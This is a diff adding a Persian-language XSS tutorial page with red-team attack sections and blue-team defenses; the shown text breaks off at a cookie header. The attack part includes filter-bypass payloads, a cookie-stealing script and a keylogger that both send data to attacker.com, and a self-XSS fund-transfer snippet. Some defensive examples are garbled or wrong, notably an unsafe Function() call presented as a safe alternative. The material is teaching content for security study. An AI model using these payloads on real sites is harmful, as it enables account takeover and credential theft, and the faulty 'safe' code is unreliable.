@@ -1,0 +1,723 @@
+---
+import MainLayout from '../layouts/MainLayout.astro';
+---
+<MainLayout title="Cross-Site Scripting (XSS)">
+<div class="container mx-auto px-4 sm:px-6 lg:px-8 py-6">
+  <h1 class="text-4xl font-bold text-purple-600 mb-4">Cross-Site Scripting (XSS)</h1>
+  <div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-lg font-bold text-yellow-400 mb-2" dir="rtl" >XSS چیست؟</div>
+    <ul class="list-disc list-inside text-white" dir="rtl" style="text-align: right;">
+      <li>اسکریپت نویسی بین سایتی (XSS) یک آسیب پذیری سمت کلاینت است که در آن مهاجمان اسکریپت های مخرب را به صفحات وب مشاهده شده توسط سایر کاربران تزریق می کنند.</li>
+      <li> XSS می تواند برای سرقت توکن های نشست، تغییر ظاهر وب سایت ها، هدایت کاربران، انجام اقدامات از طرف کاربران و انجام حملات دیگر در مرورگر کاربران استفاده شود.</li>
+    </ul>
+  </div>
+  <div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-lg font-bold text-yellow-400 mb-2" dir="rtl">شدت تأثیر XSS:</div>
+    <ul class="list-disc list-inside text-white" dir="rtl" style="text-align: right;">
+      <li>سرقت نشست (دزدیدن کوکی‌ها)</li>
+      <li>تصاحب حساب کاربری</li>
+      <li>ضبط کلیدها و فیشینگ</li>
+      <li>توزیع بدافزار</li>
+      <li>تغییر ظاهر وبسایت</li>
+      <li>دسترسی به شبکه داخلی (از طریق مرورگر)</li>
+    </ul>
+</div>
+  <h2 class="text-3xl font-bold text-red-600 mb-6">Red Team Techniques (Offensive)</h2>
+  <div class="bg-slate-800 rounded-xl p-6 mb-6">
+    <div class="text-xl font-bold text-red-400 mb-2">1. Reflected XSS</div>
+    <p class="text-white mb-4" dir="rtl" style="text-align: right;">
+        XSS انعکاسی زمانی رخ می‌دهد که اسکریپت‌های مخرب به یک برنامه کاربردی آسیب‌پذیر تزریق شده و بلافاصله در پاسخ منعکس می‌شوند. این حملات نیاز به مهندسی اجتماعی دارند تا قربانیان را فریب دهند تا payload را اجرا کنند، معمولاً از طریق ایمیل‌های فیشینگ یا لینک‌های مخرب.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-1">Basic Payload:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">http://example.com/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
+    <p class="text-gray-300 mb-4 text-sm" dir="rtl" style="text-align: right;">اثبات مفهوم ساده که اجرای اسکریپت در مرورگر قربانی را نشان می‌دهد</p>
+    
+    <div class="bg-red-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-lg font-bold text-white mb-2">Bypass Techniques and Obfuscation:
+</div>
+    <ul class="list-disc list-inside text-white space-y-3" >
+      <li>
+        <strong>تغییر حروف:</strong> &lt;SCRiPt&gt;alert(1)&lt;/script&gt;<br>
+        فیلترهای حساس به حروف بزرگ و کوچک را دور می‌زند
+      </li>
+      <li>
+        <strong>کدگذاری HTML:</strong><br>
+        <pre dir="ltr">{"<img src=x onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>"}</pre>
+        از تطابق الگوی پایه جلوگیری می‌کند
+      </li>
+      <li>
+        <strong>پروتکل جعلی جاوااسکریپت:</strong> javascript:alert(document.cookie)<br>
+        در ویژگی‌های href و هندلرهای رویداد کار می‌کند
+      </li>
+      <li>
+        <strong>کدگذاری یونیکد:</strong> &lt;img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)"&gt;<br>
+        فیلترهای مبتنی بر کلمه کلیدی را دور می‌زند
+      </li>
+    </ul>
+</div>
+    
+    <div class="font-semibold text-gray-200 mb-1">Delivery Methods:</div>
+    <ul class="list-disc list-inside text-white mb-4" dir="rtl" style="text-align: right;">
+      <li>ایمیل‌های فیشینگ حاوی لینک‌های مخرب</li>
+      <li>URL های کوتاه شده که پیلود را پنهان می‌کنند</li>
+      <li>وبسایت‌های به خطر افتاده که به نقاط آسیب‌پذیر هدایت می‌کنند</li>
+      <li>QR کدهای مخرب</li>
+    </ul>
+  </div>
+  <div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-xl font-bold text-red-400 mb-2">2. Stored XSS (Persistent XSS)</div>
+    
+    <p class="text-white mb-4" dir="rtl">
+        XSS ذخیره شده زمانی رخ می‌دهد که اسکریپت‌های مخرب به صورت دائمی در سرور هدف ذخیره شده و به تمام بازدیدکنندگان ارائه می‌شود. این نوع خطرناک‌تر از XSS انعکاسی است زیرا نیازی به مهندسی اجتماعی ندارد و می‌تواند بر چندین قربانی تأثیر بگذارد.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Cookie Theft Payload:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto"><code>{`
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: window.location.href,
+      userAgent: navigator.userAgent
+    }),
+    mode: 'no-cors',
+    credentials: 'include'
+  });
+</script>
+`.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></pre>
+    <p class="text-gray-300 mb-6 text-sm" dir="rtl">جمع‌آوری جامع اعتبار شامل کوکی‌های نشست</p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Advanced Keylogger:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto"><code>{`
+<script>
+  const loggedKeys = [];
+  const targetForms = ["login", "payment", "password"];
+
+  document.addEventListener("keypress", (e) => {
+    loggedKeys.push({
+      key: e.key,
+      time: new Date().toISOString(),
+      target: e.target.id || e.target.name
+    });
+  });
+
+  setInterval(() => {
+    if (loggedKeys.length > 0) {
+      fetch("https://attacker.com/log", {
+        method: "POST",
+        body: JSON.stringify(loggedKeys.splice(0)),
+        mode: "no-cors"
+      });
+    }
+  }, 5000);
+</script>
+`.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></pre>
+    <p class="text-gray-300 mb-6 text-sm" dir="rtl">ضبط کلیدها با اطلاعات زمینه‌ای و زمانی</p>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">نقاط تزریق رایج:</div>
+    <ul class="list-disc list-inside text-white mb-4 space-y-2" dir="rtl">
+        <li>محتوای تولید شده توسط کاربر: نظرات، پست‌های انجمن، بررسی محصولات
+            <ul class="list-circle list-inside pl-5 text-gray-300">
+                <li>اغلب به دلیل ویرایشگرهای متن غنی یا ضدعفونی نامناسب آسیب‌پذیر هستند</li>
+            </ul>
+        </li>
+        <li>پروفایل‌های کاربری: نام‌های نمایشی، بیوها، آدرس‌های آواتار
+            <ul class="list-circle list-inside pl-5 text-gray-300">
+                <li>فیلدهای پروفایل ممکن است بدون فرار مناسب به سایر کاربران نمایش داده شوند</li>
+            </ul>
+        </li>
+        <li>رابط‌های مدیریتی: نمایشگرهای لاگ، پیام‌های سیستم
+            <ul class="list-circle list-inside pl-5 text-gray-300">
+                <li>در صورت نمایش لاگ‌ها یا ورودی کاربر بدون ضدعفونی ممکن است آسیب‌پذیر باشند</li>
+            </ul>
+        </li>
+    </ul>
+    <div class="bg-red-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="font-semibold text-gray-200 mb-2">Persistence Techniques:</div>
+    <ul class="list-disc list-inside text-white space-y-2" dir="rtl">
+        <li>ذخیره پیلودها در فیلدهای پایگاه داده که به سایر کاربران نمایش داده می‌شود</li>
+        <li>آلوده کردن صفحات کش شده یا منابع استاتیک</li>
+        <li>سوء استفاده از قابلیت آپلود فایل برای ذخیره اسکریپت‌های مخرب</li>
+        <li>سوء استفاده از قالب‌ها یا ویجت‌های CMS</li>
+    </ul>
+    </div>
+</div>
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-xl font-bold text-red-400 mb-2">3. DOM-Based XSS</div>
+    
+    <p class="text-white mb-4" dir="rtl">
+        DOM XSS زمانی رخ می‌دهد که جاوااسکریپت سمت کلاینت، داده‌های قابل کنترل توسط مهاجم را بدون ضدعفونی مناسب به سینک‌های خطرناک می‌نویسد. برخلاف انواع دیگر XSS، DOM XSS کاملاً در سمت کلاینت است و سرور را درگیر نمی‌کند.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Location.hash Vulnerability:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto">
+// کد آسیب‌پذیر در برنامه:
+document.getElementById('content').innerHTML =
+    decodeURIComponent(window.location.hash.substring(1));
+
+// اکسپلویت URL:
+https://example.com/#&lt;img src=x onerror=alert(1)&gt;</pre>
+    <p class="text-gray-300 mb-6 text-sm" dir="rtl">مقدار هش کنترل شده توسط کاربر مستقیماً به innerHTML نوشته شده است</p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Common Dangerous Sinks:</div>
+    <div class="overflow-x-auto mb-6">
+        <table class="min-w-full bg-slate-700 text-white">
+            <thead>
+                <tr class="bg-slate-600">
+                    <th class="px-4 py-2">Sink</th>
+                    <th class="px-4 py-2">Risk</th>
+                    <th class="px-4 py-2">Example</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">innerHTML</td>
+                    <td class="border border-slate-600 px-4 py-2">High</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">element.innerHTML = userInput</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">document.write()</td>
+                    <td class="border border-slate-600 px-4 py-2">High</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">document.write('&lt;div&gt;' + input + '&lt;/div&gt;')</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">eval()</td>
+                    <td class="border border-slate-600 px-4 py-2">Critical</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">eval('alert("' + input + '")')</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">location</td>
+                    <td class="border border-slate-600 px-4 py-2">Medium</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">location.href = 'javascript:' + input</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">چالش‌های تشخیص:</div>
+    <ul class="list-disc list-inside text-white space-y-2" dir="rtl">
+        <li dir="rtl">هیچ پیلود سمت سروری برای تشخیص وجود ندارد (کاملاً سمت کلاینت)</li>
+        <li dir="rtl">ممکن است فقط در حالت‌های خاص DOM فعال شود</li>
+        <li dir="rtl">تشخیص آن در آنالیز استاتیک دشوار است</li>
+        <li dir="rtl">اغلب نیاز به تست دینامیک با ابزارهایی مانند DOM Invader دارد</li>
+    </ul>
+</div>
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-xl font-bold text-red-400 mb-2">4. Self-XSS</div>
+    
+    <p class="text-white mb-4" dir="rtl">
+        Self-XSS یک حمله مهندسی اجتماعی است که در آن قربانی فریب می‌خورد تا اسکریپت‌های مخرب را در کنسول مرورگر خود اجرا کند. اگرچه این حمله مستقیماً از آسیب‌پذیری در برنامه سوءاستفاده نمی‌کند، اما می‌تواند منجر به تصاحب حساب، سرقت داده‌ها یا نصب بدافزار با سوءاستفاده از اعتماد و دسترسی کاربر شود.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Example Scenario:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto">
+{`// Message shown in phishing
+"Paste this code to get free credits!"
+
+// Malicious code:
+fetch('/api/transfer', {
+  method: 'POST',
+  body: JSON.stringify({ 
+    amount: 5000,
+    to: 'attacker'
+  }),
+  credentials: 'include'
+})`}
+</pre>
+    <p class="text-gray-300 mb-6 text-sm" dir="rtl">حقه کاربران را متقاعد می‌کند که درخواست‌های مخرب را با استفاده از نشست خودشان اجرا کنند.</p>
+    <div class="bg-red-800 rounded-xl p-6 mt-6 mb-8" dir="rtl">
+    <div class="font-semibold text-gray-200 mb-2">چرا کار میکند؟</div>
+    <ul class="list-disc list-inside text-white space-y-2">
+        <li>کاربر احراز هویت شده و دارای مجوزهای بالاتر است (مانند دسترسی ادمین یا پرداخت).</li>
+        <li>جاوااسکریپت در زمینه نشست کاربر و دامنه اجرا می‌شود.</li>
+        <li>پلتفرم‌های مبتنی بر اعتماد (مانند سایت‌های بازی یا کریپتو) معمولاً هدف قرار می‌گیرند.</li>
+    </ul>
+    </div>
+</div>
+
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-xl font-bold text-red-400 mb-4">5. Mutated XSS (mXSS)</div>
+    
+    <p class="text-white mb-4" dir="rtl">
+        Mutated XSS زمانی رخ می‌دهد که ورودی‌هایی که به ظاهر بی‌خطر هستند، توسط مرورگر یا تجزیه‌کننده DOM به جاوااسکریپت قابل اجرا تبدیل می‌شوند. برخلاف XSS سنتی، پیلود اصلی در ابتدا خطرناک به نظر نمی‌رسد - تنها پس از تفسیر توسط مرورگر مخرب می‌شود. این ویژگی باعث می‌شود mXSS تشخیص و فیلتر کردنش دشوار باشد.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2">Example Payload:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto"><code>&lt;svg&gt;&lt;desc&gt;&amp;lt;script&amp;gt;alert(1)%lt;/script&amp;gt;&lt;/desc&gt;&lt;/svg&gt;</code></pre>
+    <p class="text-gray-300 mb-6 text-sm" dir="rtl">ورودی در حالت ذخیره شده بی‌خطر به نظر می‌رسد، اما توسط مرورگر بازتفسیر شده و به عنوان اسکریپت اجرا می‌شود.</p>
+    <div dir="rtl">
+    <div class="font-semibold text-gray-200 mb-2">چرا کار میکند؟</div>
+    <ul class="list-disc list-inside text-white space-y-2">
+        <li>مرورگر HTML نادرست را "اصلاح" می‌کند و عناصر DOM را متفاوت از آنچه مورد نظر است بازسازی می‌کند.</li>
+        <li>ساختار تغییر یافته عناصر قابل اجرا مانند &lt;script&gt; یا هندلرهای رویداد را معرفی می‌کند.</li>
+        <li>فیلترهای سمت سرور ممکن است ورودی‌هایی را تأیید کنند که تنها پس از تجزیه DOM خطرناک می‌شوند.</li>
+    </ul>
+    </div>
+    <div class="bg-red-800 rounded-xl p-6 mt-6 mb-8" dir="rtl">
+    <div class="font-semibold text-gray-200 mb-2 mt-4">راه کارهای تشخیص:</div>
+    <ul class="list-disc list-inside text-white space-y-2">
+        <li>از ابزارهای بررسی زنده DOM (مانند Chrome DevTools) استفاده کنید تا ببینید مرورگر واقعاً چه چیزی رندر می‌کند.</li>
+        <li>تزریق را در تگ‌های غیراستاندارد مانند &lt;svg&gt;، &lt;math&gt; یا &lt;foreignObject&gt; آزمایش کنید.</li>
+        <li>ابزارهایی مانند DOMPurify ممکن است در صورت پیکربندی نادرست در برابر mXSS محافظت نکنند.</li>
+        <li>به تبدیل موجودیت‌های HTML به تگ‌های واقعی توجه کنید.</li>
+    </ul>
+    </div><div class="font-semibold text-gray-200 mb-2 mt-4">Common mXSS Vectors:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-2 text-sm overflow-x-auto"><code>&lt;svg&gt;&lt;desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/desc&gt;&lt;/svg&gt;
+&lt;math href="javascript:alert(1)"&gt;&lt;/math&gt;
+&lt;title&gt;&amp;lt;script&amp;gt;alert(1)%lt;/script&amp;gt;&lt;/title&gt;</code></pre>
+</div>
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8" >
+    <div class="text-2xl font-bold text-red-400 mb-4">XSS Tools & Automation</div>
+    <div dir="rtl">
+    <div class="text-lg font-bold text-gray-200 mb-2">کشف و اسکن:</div>
+    <ul class="list-disc list-inside text-white space-y-2 mb-6">
+        <li><span class="text-blue-300">XSStrike</span> - ابزار پیشرفته تشخیص و فازینگ XSS</li>
+        <li><span class="text-blue-300">Katana</span> - خزنده وب که نقاط انتهایی جاوااسکریپت را تشخیص می‌دهد</li>
+        <li><span class="text-blue-300">DalFox</span> - اسکنر سریع و قدرتمند XSS طراحی شده برای اتوماسیون</li>
+        <li><span class="text-blue-300">Burp Suite Scanner</span> - اسکن غیرفعال و فعال برای XSS انعکاسی/ذخیره شده</li>
+        <li><span class="text-blue-300">OWASP ZAP</span> - اسکنر منبع باز با قابلیت‌های تست XSS</li>
+    </ul>
+    
+    <div class="text-lg font-bold text-gray-200 mb-2">اکسپلویت و تولید پیلود:</div>
+    <ul class="list-disc list-inside text-white space-y-2 mb-6">
+        <li><span class="text-blue-300">XSStrike</span> - ساخت پیلود با آگاهی از زمینه و تکنیک‌های دور زدن</li>
+        <li><span class="text-blue-300">XSS-Polyglots</span> - مجموعه‌ای از پیلودها برای زمینه‌های مختلف (DOM، HTML، JS)</li>
+        <li><span class="text-blue-300">PayloadBox</span> - مخزن پیلودهای آماده استفاده XSS</li>
+        <li><span class="text-blue-300">Burp Repeater</span> - تست دستی و تزریق پیلود</li>
+    </ul>
+    
+    <div class="text-lg font-bold text-gray-200 mb-2">پس از اکسپلویت و گزارش‌دهی:</div>
+    <ul class="list-disc list-inside text-white space-y-2">
+        <li><span class="text-blue-300">BeEF</span> - چارچوب اکسپلویت مرورگر برای اتصال و کنترل پس از XSS</li>
+        <li><span class="text-blue-300">XSS Hunter</span> - اجرای پیلودهای XSS را با پاسخ‌های خارج از باند ردیابی و ثبت می‌کند</li>
+        <li>هشدارهای سفارشی و تحویل وب‌هوک برای استخراج داده یا اثبات مفهوم</li>
+        <li><span class="text-blue-300">Burp Suite</span> - گزینه‌های تولید و صدور گزارش</li>
+    </ul>
+    </div>
+</div>
+
+<!-- Blue Team Defenses (Defensive) Section -->
+ <h2 class="text-3xl font-bold text-blue-500 mb-6">Blue Team Defenses (Defensive)</h2>
+<div class="bg-slate-800 rounded-xl p-6 mb-8">
+    <div class="text-xl font-bold text-blue-400 mb-4">1. Input Handling & Validation</div>
+    <p class="text-white mb-4" dir="rtl">
+        مدیریت صحیح ورودی اولین خط دفاعی در برابر حملات XSS است. یک استراتژی اعتبارسنجی چندلایه اطمینان می‌دهد که تنها داده‌های تمیز و مورد انتظار وارد برنامه شما می‌شوند.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">استراتژی جامع اعتبارسنجی:</div>
+    <ul class="list-disc list-inside text-white space-y-3 mb-6" >
+        <li>
+            <strong >Allowlist Validation:</strong>
+            <pre class="bg-slate-900 rounded p-3 text-gray-100 mt-2 text-sm" >// فقط حروف الفبا، اعداد و علائم نگارشی پایه مجاز است
+// Only allow alphanumeric plus basic punctuation
+const isValid = /^[a-zA-Z0-9 .,!?-]+$/.test(input);</pre>
+            <p class="text-gray-300 text-sm mt-1" dir="rtl">ورودی نامعتبر را رد کنید نه اینکه آن را پاکسازی کنید</p>
+        </li>
+        <li dir="rtl">
+            <strong>بررسی نوع و طول:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>اعمال حداکثر طول برای تمام فیلدها</li>
+                <li>اعتبارسنجی نوع داده (اعداد، ایمیل‌ها و غیره)</li>
+                <li>پیاده‌سازی اعتبارسنجی منطق کسب‌وکار</li>
+            </ul>
+        </li>
+        <li dir="rtl">
+            <strong>قوانین خاص زمینه:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>قوانین متفاوت برای نام در مقابل آدرس در مقابل محتوای HTML</li>
+                <li>مدیریت ویژه برای ورودی‌های ویرایشگر متن غنی</li>
+            </ul>
+        </li>
+    </ul>
+    
+    <div class="font-semibold text-gray-200 mb-2">Trusted Sanitization Libraries:</div>
+    <div class="overflow-x-auto mb-6">
+        <table class="min-w-full bg-slate-700 text-white">
+            <thead>
+                <tr class="bg-slate-600">
+                    <th class="px-4 py-2 text-middle">کتابخانه</th>
+                    <th class="px-4 py-2 text-middle">زبان</th>
+                    <th class="px-4 py-2 text-middle">ویژگی‌های کلیدی</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">DOMPurify</td>
+                    <td class="border border-slate-600 px-4 py-2">JavaScript</td>
+                    <td class="border border-slate-600 px-4 py-2">پاک‌ساز HTML با لیست‌های سفید قابل تنظیم</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">OWASP Java Encoder</td>
+                    <td class="border border-slate-600 px-4 py-2">Java</td>
+                    <td class="border border-slate-600 px-4 py-2">رمزگذاری آگاه از زمینه برای چندین زمینه خروجی</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">HTMLSanitizer</td>
+                    <td class="border border-slate-600 px-4 py-2">.NET</td>
+                    <td class="border border-slate-600 px-4 py-2">پاک‌ساز HTML قابل پیکربندی با لیست‌های ایمن</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">bleach</td>
+                    <td class="border border-slate-600 px-4 py-2">Python</td>
+                    <td class="border border-slate-600 px-4 py-2">پاک‌ساز HTML مبتنی بر لیست سفید</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    <div class="bg-blue-800 rounded-xl p-6 mt-6 mb-8" dir="rtl">
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">چک‌لیست پیاده‌سازی:</div>
+    <ul class="list-disc list-inside text-white space-y-2" dir="rtl">
+        <li>اعتبارسنجی هم در سمت کلاینت و هم در سمت سرور</li>
+        <li>نرمال‌سازی ورودی قبل از اعتبارسنجی (یونیکد، رمزگذاری)</li>
+        <li>ثبت شکست‌های اعتبارسنجی برای نظارت</li>
+        <li>به‌روزرسانی منظم الگوهای اعتبارسنجی</li>
+    </ul>
+    </div>
+</div>
+
+<div class="bg-slate-800 rounded-xl p-6 mb-8">
+    <div class="text-xl font-bold text-blue-400 mb-4">2. Output Encoding & Context Awareness</div>
+    
+    <p class="text-white mb-4" dir="rtl">
+        کدگذاری صحیح خروجی اطمینان می‌دهد که داده‌های ارائه شده توسط کاربر در زمینه‌های مختلف به صورت ایمن نمایش داده می‌شوند. نوع کدگذاری صحیح بستگی به جایی دارد که داده در آن قرار می‌گیرد.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">راهنمای کدگذاری بر اساس زمینه:</div>
+    <div class="overflow-x-auto mb-6">
+        <table class="min-w-full bg-slate-700 text-white">
+            <thead>
+                <tr class="bg-slate-600">
+                    <th class="px-4 py-2 text-right">زمینه</th>
+                    <th class="px-4 py-2 text-right">روش کدگذاری</th>
+                    <th class="px-4 py-2 text-right">مثال</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">بدنه HTML</td>
+                    <td class="border border-slate-600 px-4 py-2">کدگذاری موجودیت HTML</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">&amp;lt;script&amp;gt;</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">ویژگی HTML</td>
+                    <td class="border border-slate-600 px-4 py-2">کدگذاری ویژگی</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">"&gt;&amp;script&gt;</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">جاوااسکریپت</td>
+                    <td class="border border-slate-600 px-4 py-2">کدگذاری جاوااسکریپت</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">\x3cscript\x3e</td>
+                </tr>
+                <tr>
+                    <td class="border border-slate-600 px-4 py-2">URL</td>
+                    <td class="border border-slate-600 px-4 py-2">کدگذاری URL</td>
+                    <td class="border border-slate-600 px-4 py-2 font-mono text-sm">&amp;3cscript&amp;3E</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">ویژگی‌های فرار خودکار فریمورک‌ها:</div>
+    <ul class="list-disc list-inside text-white space-y-3 mb-6" dir="rtl">
+        <li>
+            <strong>React:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>فرار خودکار JSX</li>
+                <li>DangerouslySetInnerHTML برای HTML خام صریح</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Angular:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>پاک‌سازی قالب</li>
+                <li>سرویس DomSanitizer برای موارد بایپس</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Vue:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>فرار خودکار در قالب‌ها</li>
+                <li>دستور v-html برای HTML خام صریح</li>
+            </ul>
+        </li>
+    </ul>
+    <div class="bg-blue-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">APIهای خطرناک که باید از آنها اجتناب کرد</div>
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+        <div>
+            <div class="text-red-400 mb-2">الگوهای ناامن</div>
+            <pre class="bg-slate-900 rounded p-3 text-gray-100 text-sm overflow-x-auto">
+// UNSAFE PATTERNS
+element.innerHTML = userData;    // تزریق مستقیم HTML
+document.write(userInput);    // نوشتن در سند
+eval(userControlLe4String);    // اجرای کد پویا
+setTimeout(userInput);    // ارزیابی رشته
+location.href = userControlledURL;    // URLهای جاوااسکریپت</pre>
+        </div>
+        <div>
+            <div class="text-green-400 mb-2">جایگزین‌های امن</div>
+            <pre class="bg-slate-900 rounded p-3 text-gray-100 text-sm overflow-x-auto">
+{`// SAFE ALTERNATIVES
+element.textContent = userData;    // فقط متن
+document.createElement();    // دستکاری DOM
+Function('return ' + json()))
+setTimeout(function() {...}, 0);    // ارجاع تابع
+new URL(userInput).toString();    // URLهای تأیید شده`}
+</pre>
+        </div>
+    </div>
+    </div>
+</div>
+
+<!-- Content Security Policy (CSP) Section -->
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-2xl font-bold text-blue-400 mb-4">3. Content Security Policy (CSP)</div>
+    <p class="text-white mb-2" dir="rtl">سیاست امنیتی محتوا</p>
+    <p class="text-white mb-4" dir="rtl">
+        CSP یک لایه امنیتی اضافی ارائه می‌دهد که با محدود کردن منابع محتوای قابل اجرا، به کاهش حملات XSS کمک می‌کند. یک CSP به خوبی پیکربندی شده می‌تواند بسیاری از حملات XSS را حتی در صورت دور زدن سایر دفاعیات جلوگیری کند.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">پیکربندی بهینه CSP:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto">
+Content-Security-Policy:
+    default-src 'none';    # انکار پیش‌فرض
+    script-src 'self' 'nonce-[random]';  # فقط اسکریپت‌های هم‌منبع + nonced
+    style-src 'self' 'unsafe-inline';   # استایل‌های درون خطی مجاز
+    img-src 'self' data;    # تصاویر از خود و URLهای داده
+    connect-src 'self';    # XHR/fetch به منبع مشابه
+    font-src 'self';    # فونت‌ها از منبع مشابه
+    object-src 'none';    # بدون Flash/پلاگین
+    frame-src 'none';    # بدون iframe
+    base-uri 'self';    # محدود کردن URLهای پایه
+    form-action 'self';    # اهداف ارسال فرم
+    report-uri /csp-report;    # گزارش تخلف
+    report-to csp-endpoint;    # استاندارد گزارش‌دهی جدید</pre>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">استراتژی پیاده‌سازی CSP:</div>
+    <ol class="list-decimal list-inside text-white space-y-3 mb-6">
+        <li dir="rtl">شروع با حالت Report-Only:</li>
+        <pre class="bg-slate-900 rounded p-3 text-gray-100 mt-2 text-sm">Content-Security-Policy-Report-Only: ...</pre>
+        <li dir="rtl">استفاده از nonce یا hash برای اسکریپت‌های درون خطی:</li>
+        <pre class="bg-slate-900 rounded p-3 text-gray-100 mt-2 text-sm">&lt;script nonce="IDMnf93nccif0fn39fnae9h3sdfa"&gt;
+    // اسکریپت درون خطی مجاز توسط CSP
+&lt;/script&gt;</pre>
+        <li dir="rtl">محدود کردن object-src و frame-src به 'none':
+            <p class="text-gray-300 mt-1 text-sm">از حملات مبتنی بر Flash و frame جلوگیری می‌کند</p>
+        </li>
+        <li dir="rtl">پیاده‌سازی گزارش‌دهی:
+            <p class="text-gray-300 mt-1 text-sm">تخلفات را قبل از اجرا نظارت کنید</p>
+        </li>
+    </ol>
+    <div class="bg-blue-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">چک‌لیست استقرار CSP:</div>
+    <ul class="list-disc list-inside text-white space-y-2" dir="rtl">
+        <li>تست با ابزار CSP Evaluator</li>
+        <li>نظارت بر گزارش‌ها قبل از اجرا</li>
+        <li>سفت‌کردن تدریجی خط‌مشی</li>
+        <li>مستندسازی تمام استثناها</li>
+        <li>بررسی خط‌مشی هر سه ماه</li>
+    </ul>
+  </div>
+</div>
+
+<!-- Secure Session Management Section -->
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-2xl font-bold text-blue-400 mb-4">4. Secure Session Management</div>
+    <p class="text-white mb-2" dir="rtl">مدیریت امن نشست‌ها</p>
+    <p class="text-white mb-4" dir="rtl">
+        مدیریت صحیح نشست‌ها با کاهش پنجره فرصت و محافظت از توکن‌های نشست حساس، تأثیر حملات موفق XSS را محدود می‌کند.
+    </p>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">ویژگی‌های امن کوکی:</div>
+    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm overflow-x-auto">
+Set-Cookie:
